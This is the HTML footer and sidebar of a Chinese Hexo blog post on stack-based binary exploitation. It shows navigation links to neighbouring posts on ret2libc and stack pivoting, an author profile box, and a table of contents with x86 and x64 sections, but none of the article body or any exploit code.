+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2024/10/24/pwn/stack/ret2libc/">← 下一篇 ret2libc</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/10/24/pwn/stack/stack_pivoting/">栈迁移 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">南行</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/nanhang-950"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" href="mailto:2122295973@qq.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x86"><span class="toc-number">2.</span> <span class="toc-text">x86</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">2.2.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x64"><span class="toc-number">3.</span> <span class="toc-text">x64</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-1"><span class="toc-number">3.2.</span> <span class="toc-text">例题</span></a></li></ol></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>
